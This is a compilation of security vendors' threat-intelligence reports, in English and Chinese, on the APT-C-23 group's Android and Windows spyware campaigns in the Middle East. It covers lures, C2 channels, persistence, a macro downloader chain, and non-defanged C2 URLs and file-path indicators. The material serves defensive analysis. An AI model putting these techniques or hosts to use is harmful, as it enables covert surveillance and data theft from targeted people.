Authored by Oliver Devane, Vallabh Chole, and Aayush Tyagi McAfee has recently observed several malicious Chrome Extensions...
Mar 10, 2022 | 8 MIN READ
Why Am I Getting All These Notifications on my Phone?
Authored by Oliver Devane and Vallabh Chole Notifications on Chrome and Edge, both desktop browsers, are commonplace,...
Feb 25, 2022 | 5 MIN READ
Emotet’s Uncommon Approach of Masking IP Addresses
In a recent campaign of Emotet, McAfee Researchers observed a change in techniques. The Emotet maldoc was...
Feb 04, 2022 | 4 MIN READ
HANCITOR DOC drops via CLIPBOARD
Hancitor, a loader that provides Malware as a Service, has been observed distributing malware such as FickerStealer,...
Dec 13, 2021 | 6 MIN READ
The Newest Malicious Actor: “Squirrelwaffle” Malicious Doc.
Authored By Kiran Raj Due to their widespread use, Office Documents are commonly used by Malicious actors...
Nov 10, 2021 | 4 MIN READ
Social Network Account Stealers Hidden in Android Gaming Hacking Tool
Authored by: Wenfeng Yu McAfee Mobile Research team recently discovered a new piece of malware that specifically...
Oct 19, 2021 | 6 MIN READ
Malicious PowerPoint Documents on the Rise
Authored by Anuradha M McAfee Labs have observed a new phishing campaign that utilizes macro capabilities available...
Sep 21, 2021 | 6 MIN READ
Android malware distributed in Mexico uses Covid-19 to steal financial credentials
Authored by Fernando Ruiz McAfee Mobile Malware Research Team has identified malware targeting Mexico. It poses as a security banking tool or...
Sep 13, 2021 | 7 MIN READ
Phishing Android Malware Targets Taxpayers in India
Authored by ChanUng Pak McAfee’s Mobile Research team recently found a new Android malware, Elibomi, targeting taxpayers in India. The malware steals sensitive financial and private information via...
Sep 03, 2021 | 8 MIN READ
The Rise of Deep Learning for Detection and Classification of Malware
Co-written by Catherine Huang, Ph.D. and Abhishek Karnik Artificial Intelligence (AI) continues to evolve and has made huge progress over the last decade. AI shapes our daily lives. Deep...
Aug 12, 2021 | 7 MIN READPosted: 31 Aug, 2018 5 Min Read Expert Perspectives Subscribe Follow twitter linkedin Ongoing Android Malware Campaign Targets Palestinians - Part 2 More about the inner works of the APT-C-23 group, which targets victims in the Middle East, mainly in the Palestinian territories In our previous post , we discussed the persistence of the "APT-C-23" group. Even though their operation was exposed, they continue to improve their malware and infect more victims. Now we would like to share more technical details and provide a broader look at their operations, including a long list of indicators of compromise.
Overview
The APT-C-23 group targets victims in the Middle East, mainly in the Palestinian territories. In our research, we discovered that the group registered hundreds of domains and infected thousands of victims across more than 20 countries.
When it comes to masquerading their malware, the group uses two kinds of applications:
Chat applications, such as Chat Me, Chatous, Go Chat, Love Chat, MeetMe, SendBird, SoChat, VoiceChat, WeChat and WhispersTalk along with similar apps.
Distribution
As we demonstrated in our previous post, the attackers were able to upload some of their malware to Google Play. In order to improve their infection rate, they have two main methods of distribution. The first one is via SMS with a URL to Google Drive or a C&C domain that hosts the APK. The second method is by uploading their apps to third-party stores.
We spotted “Zee Player” at 7 different third-party stores. We can’t conclude those stores are malicious, or even complicit, as some of them just scrape Google Play, and others just mirror each other. Legitimate applications reside alongside the malware, which makes it harder to make a case against those stores.
"Safe to download and free of any virus" - Third party stores. Communication
In order to receive commands from the C&C server, the malware authors implemented two ways of pushing messages to the app. The more complete implementation leverages Firebase Cloud Messaging. Additionally, the malware developers also implemented SMS communication as a backup.
Firebase Cloud Messaging
Firebase Cloud Messaging (FCM) is a free cloud service from Google that allows app developers to send notifications and messages to users across a variety of platforms easily and with high reliability. This utility is part of Google’s Firebase platform that offers app developers more convenient features. It is very pragmatic for the attackers to use Firebase, as this makes it easy to use other existing tools such as Google analytics, which is also included in those apps.
Firebase messages SMS
The attackers created a fallback system using SMS commands, which is useful when there is no Internet connectivity and the victim can turn on and off the mobile data and Wi-Fi. In addition, they can update the C&C domain in case it needs to go offline, thus extending the malware’s shelf life.
SMS commands How it Works
When the app starts for the first time, it communicates with a pre-defined C&C server, which refers the app to another C&C server address that will be used from that point on. This behavior allows the malware authors to use many different domains and makes it harder to block all of those C&C server domains. We observed over a hundred different domains that have been used for this purpose. After getting the updated domain, the app sends its FCM token, which is necessary in order to allow the C&C server to utilize FCM and send commands to the app.
The following diagram shows the full flow of communication between the malicious app and the C&C servers:
These malware apps have a long list of available commands, allowing the malware operators to get a lot of information from the devices and spy on the device’s owner. Almost all of the commands are available through the FCM communication path, with some also available through the SMS communication path. Most importantly, there are also resiliency commands such as ‘Update C&C domain’, ‘Get an updated FCM token’ and ‘Enable data connection’.
The full list of commands, as well as the communication method that they are available through, can be found in the following table:
Installation of More Malware
Some of the commands we've seen are the installation of applications. In order to receive consent from the victim, the attackers created activities that simulate updates to popular applications such as Facebook, WhatsApp, Google Play, Instagram and Messenger.
A “Facebook update” turning into “Android Settings” installation The malware can also uninstall its own applications, although the high variety of versions can cause some mix-ups:
An uninstall message of “Meet Me” mistakenly over “Facebook” Recent Additions and Capabilities
With the constant changes made to the code, we would like to point out a few “features” that were added or otherwise changed in the recent samples:
Device Administrator - Since the early stages of the campaign the malware tries to hide itself by hiding its icon. In recent samples, it also asks for device administrator permissions to gain a strong foothold on the device as it becomes even more difficult to locate and disable it.
GetNumberUSSDService - The attackers use USSD as a way to retrieve the phone number, and an accessibility service was added in order to capture the alert dialog that is produced from the USSD codes that has a number that starts with “056” (Wataniya) or “059” (Jawwal), the Palestinian cellular prefixes codes.
Accessibility service USSD codes of “Jawwal” and “Wataniya” App Licensing - It was very odd to see the permission "com.android.vending.CHECK_LICENSE" in a Malware sample. It’s not correctly implemented, and the purpose is not totally clear, but it shows the intention to have a foothold at Google Play (licensing is only for apps from the store), and maybe some sort of scheme to use APK expansion files , as it requires licensing.
Power management - REQUEST_IGNORE_BATTERY_OPTIMIZATIONS – The purpose of this permission is exemption from power management features, meaning adding the malware to a whitelist so that the victim will not be notified in case the malware has high battery usage.
CacheCleaner - The attackers created a maintenance task that deletes temporary files in an effort to always have enough space for the leaked data before it’s being uploaded:
It also tries to free memory, in a silly way with a random number of megabytes:
Mitigations
Stay protected from mobile malware by taking these precautions:
Do not download apps from unfamiliar sites
Only install apps from trusted sources
Pay close attention to the permissions requested by apps
Install a suitable mobile security app, such as SEP Mobile or Norton , to protect your device and data
Keep your operating system up to date
Make frequent backups of important data
Indicators of Compromise (IoCs)
As this campaign was active for a while, hundreds of samples and domains have accumulated. All are available here .2017年3月15日奇安信红雨滴高级威胁分析团队已经对APT-C-23做了详细的揭露，APT-C-23组织的目标主要集中在中东地区，尤其活跃在巴勒斯坦的领土上。2016 年 5 月起至今，双尾蝎组织（APT-C-23）对巴勒斯坦教育机构、军事机构等重要领域展开了有组织、有计划、有针对性的长时间不间断攻击。攻击平台主要包括 Windows 与 Android。
Android恶意程序主要伪装成两类应用程序：一类为聊天工具，另一类为软件升级工具。其传播方式主要有两种：第一种方法是通过短信，其中包含指向Google云端硬盘的网址或托管APK的C＆C域名，第二种方法是将他们的应用程序上传到第三方应用商店。其中Android版本当时已经更新了两个版本，类名对应的功能如下图。
近期Check Point发现了APT-C-23使用了带有政治主题的诱饵PDF文件，使用了新的C2 frowtisice[.]club 。
经过我们分析，新样本在原有的基础上功能进行了增加，代码结构、控制指令等都进行了巨大的改变，程序运行后会显示带有政治主题的诱饵PDF文件，而随着巴以冲突的持续升温，APT-C-23再次更新其目的也显而易见。
下图为样本运行以后带有政治主题的PDF诱饵文件：
APT-C-23新样本通过仿冒Acrobat更新，并通过显示含有政治主题的诱饵PDF文件，诱骗用户安装使用；恶意软件主要目的为窃取用户手机信息，并对用户手机进行远程控制，新程序继承了APT-C-23下发控制指令的模式，实现了两种向应用推送消息的方式，FCM和SMS通信，从而可以更加稳定的接收到控制指令；程序运行以后会隐藏自身图标，从而保护自身不被卸载；程序会通过两种方式下发控制指令，两种方式下发的指令其功能类似，例如：开始对用户手机进行录音，上传用户手机短信，上传用户手机通讯录，上传用户手机文件等操作。
恶意程序运行界面
程序运行后隐藏自身图标
APT-C-23实现了两种向应用推送消息的方式，FCM和SMS通信，从而可以更加稳定的接收到控制指令。
通过SMS的控制指令下发
SMS控制指令：
中东地区沟通了欧亚非，地理位置十分重要，而由于石油资源、宗教信仰、地缘政治、历史原因等问题又常年战乱不断。随着手机的普及与移动互联网的发展，移动平台已经成为了APT攻击的新战场。APT-C-23常年持续对巴勒斯坦多个重要领域进行攻击，而此次在巴以双方摩擦不断的情况下，APT-C-23移动端再次更新，并且使用了带有政治主题的PDF诱饵样本，诱骗用户安装使用。所以移动APT的更新速率以及实时性值得我们关注，我们也会时刻关注APT-C-23 Windows 与 Android最新变种的出现。
https://www.freebuf.com/articles/system/129223.html
https://www.jianshu.com/p/702ddf8dd51c
https://www.symantec.com/blogs/expert-perspectives/ongoing-android-malware-campaign-targets-palestinians-part-2
红雨滴高级威胁研究团队（RedDripTeam）
奇安信旗下的高级威胁研究团队红雨滴（天眼实验室）,成立于2015年，持续运营奇安信威胁情报中心至今，专注于APT攻击类高级威胁的研究，是国内首个发布并命名“海莲花”（APT-C-00，OceanLotus）APT攻击团伙的安全研究团队，也是当前奇安信威胁情报中心的主力威胁分析技术支持团队。
目前，红雨滴团队拥有数十人的专业分析师和相应的数据运营和平台开发人员，覆盖威胁情报运营的各个环节：公开情报收集、自有数据处理、恶意代码分析、网络流量解析、线索发现挖掘拓展、追踪溯源，实现安全事件分析的全流程运营。团队对外输出机读威胁情报数据支持奇安信自有和第三方的检测类安全产品，实现高效的威胁发现、损失评估及处置建议提供，同时也为公众和监管方输出事件和团伙层面的全面高级威胁分析报告。Introduction:
Earlier today, IDF’s spokesperson revealed that IDF (Israel Defense Force) and ISA (Israel Security Agency AKA “Shin Bet”) conducted a joint operation to take down a Hamas operation targeting IDF soldiers, dubbed ‘Rebound’.
In this article, we will describe the capabilities and provide technical analysis of the malware used, along with the attack’s affiliation to APT-C-23, a hacking group with previously reported attacks in the Middle East
Technical Analysis:
This MRAT (Mobile Remote Access Trojan) is disguised as a set of dating apps, “GrixyApp”, “ZatuApp”, and “Catch&See”, all with dedicated websites, and descriptions of dating applications.
The victims received a link to download the malicious application from a Hamas operator disguising themselves as an attractive woman. Once the application is installed and executed, it shows an error message stating that the device is not supported, and the app will uninstall itself – which actually does not happen, and the app only hides its icon.
Figure 1 – Fake error message
While hidden, the application communicates with the same server it was downloaded from, using the MQTT protocol.
The main functionality of this malware is to collect data on the victim such as phone number, location, SMS messages and more, while having the capability to extend its code via a received command. The command can provide the application with a URL to a DEX file, which is then downloaded and executed.
Figure 2 – Code to download an additional DEX file
Figure 3 – Communication with the C&C
Figure 4 – Collecting device information
Figure 5 – Collecting a list of installed applications
Figure 6 – Collecting storage information
Video Player //research.checkpoint.com/wp-content/uploads/2020/02/1z.mp4 00:00 00:00 00:16 Use Up/Down Arrow keys to increase or decrease volume.
Affiliation:
The tactics, techniques and procedures (TTPs) used in this new wave of attacks are similar to ones used in the past by previous APT-C-23 campaigns.
First, the threat group develops backdoors for Android devices that are usually disguised as chatting applications.
Figure 8 – Promotion websites
Second, dedicated and specially crafted websites are set up by the threat group to promote those backdoors, explain their functionality, and offer a direct link to download them. Those domains, and others that are used for C&C communications by known APT-C-23 samples, are usually registered using NameCheap, and this was also the case with the newly discovered websites.
Lastly, malicious samples affiliated with APT-C-23 made references to names of actors, TV characters and celebrities both in their source code and C&C communication. Although the new backdoors lacked those references, we were able to see name of celebrities and known figures such as Jim Morrison, Eliza Doolittle, Gretchen Bleiler and Dolores Huerta in the backdoor’s website, catchansee[.]com.
Figure 9 – References to celebrities in server code
This campaign serves as a sharp reminder that effort from system developers alone is not enough to build a secure Android eco-system. It requires attention and action from system developers, device manufacturers, app developers, and users, so that vulnerability fixes are patched, distributed, adopted and installed in time.
It is also another example for why organizations and consumers alike should have an advanced mobile threat prevention solution installed on the device to protect themselves against the possibility of unknowingly installing malicious apps, even from trusted app stores.本文由Gcow安全团队追影小组首发。
--------------------------------------------------------------------------------------------
双尾蝎APT组织(又名: APT-C-23 )，该组织从 2016 年 5 月开始就一直对巴勒斯坦教育机构、军事机构等重要领域展开了有组织、有计划、有针对性的长时间不间断攻击.其在2017年的时候其攻击活动被360企业 安全进行了披露，并且其主要的攻击区域为中东，其中以色列与巴勒斯坦更受该组织的青睐。
攻击平台主要包括 Windows 与Android :
其中针对windows 的平台，其比较常见的手法有投放带有" *.exe "或" *.scr "文件后缀的释放者文件，在目标用户打开后释放对应的诱饵文档，并且释放下一步的侦查者(Recon).持久存在的方式也不唯一，一般 通过写入注册表启动项以及释放指向持久化远控的快捷方式到自启动文件夹下.其侦查者会收集当前机器 的相关信息包含(系统版本，计算名，杀毒软件信息，当前文件所在路径，恶意软件当前版本)，以及其解析 C2 的回显指令，并执行.比如:远程shell，截屏和文件下载。
同时根据别的安全厂商的报告，我们也得知该组织拥有于攻击Android 平台的组件，拥有定位、短信拦截、电话录音等，并且还会收集文档、图片、联系人、短信等情报信息；PC 端后门程序功能包括收集用户信息上传到指定服务器的功能、远程下载文件能力。
近日check point 安全厂商披露了该组织自导自演，给以色列士兵手上安装恶意软件的攻击活动.可以从中看出该团伙的攻击设计之巧妙，准备之充分。但最后结果还是被以色列给反制了一波............
Gcow安全团队追影小组于 2019.12 月初开始监测到了双尾蝎APT组织通过投递带有诱饵文件的相关可执行文件针对巴勒斯坦的部门 进行了相应的攻击活动，这些诱饵文件涉及教育，科技，政治等方面的内容，其攻击活动一直持续到了 2020.2 月底.追影小组对该组织进行了一定时间的追踪.遂写成此报告还请各位看官欣赏。
二.样本信息介绍以及分析
1. 样本信息介绍
在本次双尾蝎APT组织针对巴勒斯坦的活动中，Gcow安全团队追影小组一共捕获了 14 个样本，均为windows 样本，其中 12 个样本是释放诱饵文档的可执行文件， 2 个样本是带有恶意宏的诱饵文档。
在这 12 个可执行文件样本中，有 7 个样本伪装成pdf 文档文件，有 1 个样本伪装为word 文档文件，有 2 个样本伪装为rar 压缩文件。有 2 个样本伪装成mp3，mp4 音频文件。
在这 14 个Windows 恶意样本中，其诱饵文档的题材，政治类的样本数量有 9 个，教育类的样本数量有 1 个，科研类的样本数量有 1 个，未知类的样本数量有 3 个(注意:未知指得是其诱饵文档出现错误无法打开或者其内容属于无关内容)。
现在各位看官应该对这批双尾蝎组织针对巴勒斯坦的攻击活动有了一个大概的认识，但是由于这批样本之 中有一些话题是以色列和巴勒斯坦共有的，这里Gcow 安全团队追影小组持该组织主要是攻击巴勒斯坦的观点，若各位看官有更多的证据，欢迎联系我们团队.注意:这里只是一家之言，还请各位看官须知。
那下面追影小组将以一个恶意样本进行详细分析，其他样本采取略写的形式向各位看官描述此次攻击活 动。注意:因为其他样本的主要逻辑是相同的，所以没有必要枉费笔墨。
2. 样本分析
(1).Deﬁne the Internet in government institutions
a. 样本信息
b. 样本分析
通过对样本的分析我们得知了该样本是兼具释放者(Dropper)与下载者(Downloader)的功能，其释放者
(Dropper)主要是用以释放诱饵文档加以伪装以及将自身拷贝到%ProgramData%目录下，并且生成执行该文件的快捷方式并且释放于 自启动文件夹下，而下载者(Downloader)部分主要是通过进行信息收集以及等待C2给予的回显，主要功能有:远程shell，文件下载，屏幕截屏。
i. 释放者(Dropper)部分:
通过FindResource 函数查找名称为:MyData的资源
通过LoadResource 函数加载该资源
通过LockResource 函数锁定资源并且获取资源在内存的地址
通过SizeOfResource 函数通过获取资源的地址计算该资源的长度
利用CreateFilewW 函数在自启动文件夹下创造指向%ProgramData%\SyncDownOptzHostProc.exe 的快捷方式SyncDownOptzHostProc.lnk
ii. 下载者(Downloader)部分:
通过CreateFile 函数创造%ProgramData%\GUID.bin 文件，内部写入对应本机的GUID .当软件再次运行的时候检查自身是否位于%ProgramData% 文件夹下，若不是则释放pdf文档。若是，则释放lnk 到自启动文件夹。
将这些信息按照如下方式拼接好后，通过Send 方式向URL地址
http://nicoledotson.icu/debby/weatherford/yportysnr 发送上线报文
cname=&av=&osversion=&aname=&ver=
通过http://nicoledotson.icu/debby/weatherford/ekspertyza URL获取功能命令(功能为截屏，远程shell，以及下载文件)
发送屏幕快照
截取屏幕快照函数
b. 样本分析
通过使用olevba dump出其包含的恶意宏代码(如下图所示:)
其主要逻辑为:下载该URL http://linda-callaghan.icu/Minkowski/brown 上的内容到本台机器的%ProgramData%\IntegratedOffice.txt (此时并不是其后门，而且后门文件的base64 编码后的结果)。通过读取IntegratedOffice.txt 的所有内容将其解码后，把数据流写入%ProgramData%\IntegratedOffice.exe 中，并且延迟运行%ProgramData%\IntegratedOffice.exe 删除%ProgramData%\IntegratedOffice.txt
通过FindResource 函数查找资源MYDATA ，通过下图我们可以看出该资源是一个rar 文件
通过CreateFile 函数将rar 文件源数据写入%Temp%\jalsa.rar (诱饵文件)中
但由于其塞入数据的错误导致该Meeting Agenda.pdf 文件无法正常打开故此将该样本归因到未知类题材，之后的行为就和之前的如出一辙了，在此就不必多费笔墨。
(9).Scholarships in Serbia 2019-2020_pdf
a. 样本信息
之后的行为就和之前的如出一辙了，在此就不必多费笔墨
(11).asala-panet-il-music-live-892578923756-mp3
a.样本信息
通过FindResource 函数查找资源MYDATA ，通过下图我们可以看出该资源是一个unknown 文件
通过CreateFile 函数将文件源数据写入%Temp%\asala.mp3 (诱饵文件)中
歌曲挺好听的，但是我们也不知道啥意思，将其归属于未知类题材样本
(12).artisan-video-5625572889047205-9356297846-mp4
a. 样本信息
三.组织关联与技术演进
在本次活动中，我们可以清晰的看到双尾蝎APT组织的攻击手段，同时Gcow 安全团队追影小组也对其进行了一定的组织关联，并且对其技术的演进做了一定的研究。下面我们将分为组织关联与技术演进这两部分 内容进行详细的叙述。
注意:下文中的时间段仅仅为参考值，并非准确时间。由于在这一时间段内该类样本较多，故此分类。
1. 组织关联
(1).样本执行流程基本相似
我们根据对比了从 2017 到 2020 年所有疑似属于双尾蝎APT组织的样本，(注意:这里比对的样本主要是windows平台的可执行文件样本).在 2017 年到 2019 年的样本中我们可以看出其先在临时文件夹下释放诱饵文件，再打开迷惑受害者，再将自身拷贝到%ProgramData% 下.创建指向%ProgramData%下的自拷贝恶意文件的快捷方式于自启动文件夹.本次活动与 2018 年 2019 年的活动所使用样本的流程极为相似.如下图所示.故判断为该活动属于双尾蝎 APT组织。
(2).C&C中存在名人姓名的痕迹
根据checkpoint 的报告我们得知，该组织乐于使用一些明星或者名人的名字在其C&C 服务器上.左图是checkpoint 安全厂商揭露其针对以色列士兵的活动的报告原文，我们可以看到其中含有JimMorrison ， Eliza Dollittle ， Gretchen Bleiler 等名字.而右图在带有恶意宏文档的样本中，我们发现了其带有Minkowski 这个字符.通过搜索我们发现其来源于Hermann Minkowski 名字的一部分，勉强地符合了双尾蝎APT组织的特征之一。
2. 技术演进
(1). 在编写语言上的演进
根据 360 的报告我们可以得知双尾蝎APT组织在 2016 年到 2017 年这段时间内该组织主要采用了VC 去编写载荷.再到 2017 年到 2018 年这段时间内该组织主要是以Delphi 来编写其侦查者(Recon)，根据Gcow 安全团队追影小组的跟踪，该组织在 2018 年到 2019 年这段时间内也使用了Delphi 编写的恶意载荷。与 2017 年到 2018 年不同的是: 2017 年到 2018 年所采用的编译器信息是:Borland Delphi 2014XE6。而在 2018 年到 2019 年这个时间段内采用的编辑器信息是:Borland Delphi 2014XE7- S.10。同时在本次活动中该组织使用 Pascal 语言来编写载荷。可见该组织一直在不断寻求一些受众面现在越来越小的语言以逃脱杀软对其的监测。
(2). 编译时间戳的演进
根据 360 的报告我们可以得知双尾蝎APT组织在 2016 年到 2018 年这个时间段中，该组织所使用的恶意载荷的时间戳信息大部分时间集中位于北京的下午以及第二天的凌晨，属于中东地区的时间。而在2019年 7 月份捕获的双尾蝎APT组织样本中该组织的编译戳为 2019.7.14 11:08:48 而在本次活动所捕获的样本中我们发现该组织将编译时间戳统一改为: 1970.1.1 1:00 ，也就是置0.通过伪造时间戳以阻断安全人员的关联以及对其的地域判断。
(3). 自拷贝方式的演进
双尾蝎APT组织在 2017 年到 2019 年的活动中，擅长使用copy 命令将自身拷贝到%ProgramData% 下.而可能由于copy 指令的敏感或者已经被各大安全厂商识别。在 2019 年 7 月份的时候.该组织恢复了之前采用CopyFile windows API函数的方式将自身拷贝到%ProgramData% 下。
(4). 持久化方式的演进
根据 360 的报告，我们可以得知双尾蝎APT组织在 2016 年到 2017 年的活动之中，主要采用的是修改注册表添加启动项的方式进行权限的持久化存在。而根据追影小组的捕获的样本，我们发现在 2017 年到2018 年的这段时间内该组织使用拥有白名单Shortcut.exe 通过命令行的方式在自启动文件夹中添加指向自拷贝后的恶意文件的快捷方式。而在本次活动中，该组织则采用调用CreateFile Windows API 函数的方式在自启动文件夹中创建指向自拷贝后恶意文件的快捷方式以完成持久化存在。
(5).C&C报文的演进
为了对比的方便，我们只对比双尾蝎APT组织 2018 年到 2019 年的上半年的活动与本次活动的C&C 报文的区别。如图所示下图的左上是本次活动的样本的C&C 报文，右下角的是 2018 年到 2019 年上半年活动的样本的C&C 报文。通过下面所给出的解密我们可以得知两个样本所向C&C 收集并发送的信息基本相同。同时值得注意的是该组织逐渐减少明文的直接发送收集到的注意而开始采用比较常见的通过Base64的方式编码后在发送。同时在ver版本中我们发现: 2018 年到 2019 年上半年的样本的后门版本号为: 1.4.2.MUSv1107 (推测是2018.11.07更新的后门);而在本次活动中后门版本号为: 5.HXD.zz.1201 (推测是2019.12.01号更新的后门)，由此可见该组织正在随着披露的增加而不断的进行后门的更迭。
1. 概述
Gcow 安全团队追影小组针对双尾蝎APT组织此次针对巴勒斯坦的活动进行了详细的分析并且通过绘制了一幅样本执行的流程图方便各位看官的理解。
该组织拥有很强的攻击能力，其载荷涵盖较广(Windows和Android平台).并且在被以色列进行导弹物理 打击后快速恢复其攻击能力.对巴勒斯坦地区进行了一波较为猛烈的攻势，同时我们绘制了一幅本次活动 之中样本与C&C 的关系图。
通过之前的分析我们发现了该组织拥有很强的技术对抗能力，并且其投放的样本一直围绕着与巴勒斯坦和以色列的敏感话题进行投放，我们对其话题关键字做了统计，方便各位看官了解。
2. 处置方案:
%TEMP%\*.pdf(*.mp3，*.mp4，*.rar，*.doc) [诱饵文档]
%ProgramData%\SyncDownOptzHostProc.exe [侦查者主体文件]
%ProgramData%\IntegratedOffice.exe[侦查者主体文件]
%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\SyncDownOptzHostProc.lnk [指向侦查者主体文件的快捷方式用于权限维持]
%ProgramData%\GUID.bin [标记感染]
3. 结语
通过本次分析报告，我们相信一定给各位看官提供了一个更加充分了解该组织的机会.我们在前面分析了 该组织的技术特点以及对该组织实施攻击的攻击手法的演进进行了详细的概述。同时在后面的部分我们 也会贴出该组织最新活动所使用样本的IOCs 供给各位感兴趣的看官交流与学习.同时我们希望各位看官如果有其他的意见欢迎向我们提出。
五.IOCs:
%TEMP%\ *.pdf(*.mp3，*.mp4，*.rar，*.doc)
%ProgramData%\SyncDownOptzHostProc.exe双尾蝎组织（APT-C-23），是一个针对中东地区相关国家的教育机构、军事机构等重要领域进行网络间谍活动，以窃取敏感信息为主的网络攻击组织。攻击平台主要包括 Windows 与 Android。该组织的攻击活动最早可追溯到2016年，近年来该组织活动频繁不断被数个国内外安全团队持续追踪和披露。
2020年2月16日，以色列国防军IDF网站称，他们发现哈马斯的一系列网络攻击行动，通过制作了多个聊天工具相关的钓鱼网站，利用社交媒体伪装成美女诱骗以色列国防军士兵下载安装伪装成聊天工具的间谍软件，从而窃取以色列国防军的隐私信息，并最终认为与APT-C-23组织有关。
近期，360烽火实验室发现了与以色列国防军曝光的双尾蝎组织攻击行动相关的另一起网络攻击活动，该活动中使用的间谍软件伪装成MygramIM 应用，并利用钓鱼网站进行传播，根据网站信息，此次攻击活动仍然针对中东地区。
二、载荷投递
（一）攻击方式
双尾蝎组织在此次攻击活动中使用的载荷投递方式为钓鱼攻击。此次攻击活动中，双尾蝎组织制作了了一个MygramIM应用更新网站，该网站详细介绍了MygramIM应用的相关信息，并且提供了对应的下载功能。
图1 钓鱼网站
该网站表面上看着制作精美，但是仔细观察，会发现大量粗制滥造内容，许多介绍内容完全相同，并且大多数链接无法打开，可见该网站只是双尾蝎组织为此次攻击行动临时制作。
图2 钓鱼网站粗制滥造内容
通过对钓鱼网站进行分析，我们发现了一段被注释的测试代码，其中一个链接指向了一个视频文件，该视频文件的内容为伊斯兰世界上著名古兰经阅读者Mashary Rashed阅读古兰经，据此我们推测此次攻击行动的攻击区域为中东地区。
图3 网站测试代码
图4 视频内容
（二）伪装对象
此次攻击活动中，双尾蝎组织将攻击样本伪装成了Google Play上的收费应用Mygram IM，钓鱼网站上对应用的描述与Google Play上Mygram IM的描述内容没有丝毫差别。
图5 Google Play上的Mygram IM
当应用启动后提示用户安装Google Play上的Mygram IM，并隐藏自身图标，在后台运行，如下图所示
图6 攻击样本启动后界面
三、功能分析
此次攻击的恶意样本与早期攻击样本类似，包含录音、上传文件/联系人/短信等恶意行为，并且都是通过Google的FCM（Firebase Cloud Messaging）服务和短信下发指令执行恶意功能。其中此次攻击中使用短信下发的指令经过了Base64编码，图7展示的为Base64解码后的指令和功能，图8展示了Firebase Cloud Messaging 下发的指令和功能。
图7 短信指令与功能
图8 FCM指令与功能
四、溯源关联
（一）C&C关联
我们发现此次攻击样本证书签名下的其中一个样本的CC（rythergannon.info）出现在公开威胁情报中，并且归属于APT-C-23组织。
图9 公开威胁情报
（二）代码结构
此次攻击样本与早期双尾蝎组织均使用Google的FCM（Firebase Cloud Messaging）服务和短信下发指令执行恶意功能。此前其他安全厂商揭露双尾蝎组织偏爱使用演员名进行命名，此次攻击样本使用FCM下发的指令名称也使用了大量演员名，并且存在大量相似代码结构，下图展示了早期版本和此次最新攻击样本窃取短信的代码。
图10 早期代码与最新代码
人是网络安全脆弱因素，网络攻防最终还是人的对抗，从双尾蝎攻击以色列国防军到肚脑虫攻击巴基斯坦以及此次双尾蝎针对中东地区的攻击活动，都是利用钓鱼网站伪装成聊天应用发起的网络攻击，攻击成败的关键都在于被攻击者的安全意识。安全的本质是人与人的对抗，相关企业在做好系统防护的同时也需要提升相关人员的安全意识。
本文链接： https://blogs.360.cn/post/APT-C-23_target_at_Middle_East.html
-- EOF --
360烽火实验室（360 Beaconlab）
2020-05-18 17:07:14
，添加在分类
android平台
AndroidESET researchers uncover a new version of Android spyware used by the APT-C-23 threat group against targets in the Middle East
We have discovered a previously unreported version of Android spyware used by APT-C-23, a threat group also known as Two-tailed Scorpion and mainly targeting the Middle East. ESET products detect the malware as Android/SpyC23.A.
The APT-C-23 group is known to have used both Windows and Android components in its operations, with the Android components first described in 2017. In the same year, multiple analyses of APT-C-23’s mobile malware were published.
Compared to the versions documented in 2017, Android/SpyC23.A has extended spying functionality, including reading notifications from messaging apps, call recording and screen recording, and new stealth features, such as dismissing notifications from built-in Android security apps. One of the ways the spyware is distributed is via a fake Android app store, using well-known apps as a lure.
Timeline and discovery
The group’s activities were first described by Qihoo 360 Technology in March 2017 under the name Two-tailed Scorpion . In the same year, Palo Alto Networks, Lookout and Trend Micro described other versions of the mobile malware, naming them VAMP , FrozenCell and GnatSpy , respectively. Lookout published an analysis of another version of the malware, named Desert Scorpion , in April 2018, and at the beginning of 2020, Check Point Research reported new mobile malware attacks attributed to the APT-C-23 group.
In April 2020, @malwrhunterteam tweeted about a new Android malware sample. According to the VirusTotal service, no security vendor besides ESET detected the sample at the time. In cooperation with @malwrhunterteam, we recognized the malware to be part of the APT-C-23 arsenal.
Figure 1. VirusTotal detection rate for one of the newly discovered samples
In June, 2020, @malwrhunterteam tweeted about another little-detected Android malware sample, which turned out to be connected to the sample from April. A deeper analysis showed that both the April and June discoveries were both variants of the same new Android malware used by the APT-C-23 group.
Figure 2 shows the timeline of these events.
Figure 2. Timeline of previously documented APT-C-23 mobile malware and ESET’s 2020 investigation
Distribution
Thanks to information from @malwrhunterteam, we identified a fake Android app store used to distribute the malware. At the time of analysis, the “DigitalApps” store, pictured in Figure 3, contained both malicious and clean items. The non-malicious items would redirect users to another unofficial Android app store, serving legitimate apps. The malware was hidden in apps posing as AndroidUpdate, Threema and Telegram. The latter two of these lures also downloaded the impersonated apps with full functionality along with the malware. This mechanism is described in detail in the Functionality section.
Figure 3. The fake app store serving APT-C-23 spyware
Interestingly, the downloads were limited by needing to enter a six-digit coupon code, as seen in Figure 4. This may be a way to prevent those not targeted by the group from installing the malware, and hence keep a lower profile. Although we didn’t have a coupon code, downloading the app wasn’t such a problem – all that was needed was to append “/download” to the URL.
Figure 4. The fake app store requiring a coupon code for downloading malware
This fake app store is likely just one of the distribution methods used by the threat group. Our telemetry from 2020 showed samples impersonating apps that were not a part of this fake app store.
ESET telemetry data
According to ESET telemetry and VirusTotal data, Android/SpyC23.A has been in the wild since May 2019.
In June 2020, ESET systems blocked this spyware on client devices in Israel. The detected malware samples were disguised as the messaging app “WeMessage”, shown in Figure 5.
While there is a legitimate messaging app called weMessage on Google Play, as seen in Figure 6, the malicious app uses entirely different graphics and doesn’t seem to impersonate the legitimate app other than by appropriating its name. In our research, we haven’t found another app using the same or similar interface as the malicious WeMessage app, so it’s possible that the attackers created custom graphics.
We don’t know how this particular version of the spyware was distributed – the malicious WeMessage app wasn’t offered in the aforementioned fake app store.
Figure 5. Graphics used by the malicious WeMessage app
Figure 6. The legitimate weMessage app on Google Play
Functionality
Based on our research, the malware mainly impersonates messaging apps. The attackers might have chosen this guise to justify the various permissions requested by the malware.
Installation and permissions
Before installation, Android/SpyC23.A requests a number of invasive permissions, including taking pictures and videos, recording audio, reading and modifying contacts, and reading and sending SMS.
After installation, the malware requests a series of additional, sensitive permissions, using social engineering-like techniques to fool technically inexperienced users. These additional permission requests are disguised as security and privacy features:
Under the guise of “Messages Encryption”, the app requests permission to read the user’s notifications
Under the guise of “Private Messages”, the app requests permission to turn off Play Protect
Under the guise of “Private Video Chat”, the app requests permission to record the user’s screen
These steps are shown in the video below.
